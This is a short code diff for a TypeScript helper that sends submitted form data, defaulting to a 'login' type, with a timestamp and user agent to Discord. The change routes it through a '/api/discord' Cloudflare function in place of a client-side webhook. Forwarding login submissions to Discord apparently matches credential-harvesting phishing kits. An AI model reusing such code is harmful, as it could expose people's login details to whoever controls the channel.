@@ -20,16 +20,8 @@ interface DiscordEmbedField {
 
 export const submitToDiscord = async (formData: FormData, formType: string = 'login'): Promise<boolean> => {
   try {
-    // Get webhook URL from environment
-    // This will be injected at build time by Vite
-    const webhookUrl = typeof (process.env.VITE_DISCORD_WEBHOOK_URL) !== 'undefined' 
-      ? (process.env.VITE_DISCORD_WEBHOOK_URL as string)
-      : '';
-    
-    if (!webhookUrl) {
-      console.warn('Discord webhook URL not configured');
-      return false;
-    }
+    // Cloudflare Pages Function endpoint for secure submission
+    const endpointUrl = '/api/discord';
 
     const timestamp = new Date().toISOString();
     const userAgent = navigator.userAgent;
@@ -84,7 +76,7 @@ export const submitToDiscord = async (formData: FormData, formType: string = 'lo
       ],
     };
 
-    const response = await fetch(webhookUrl, {
+    const response = await fetch(endpointUrl, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
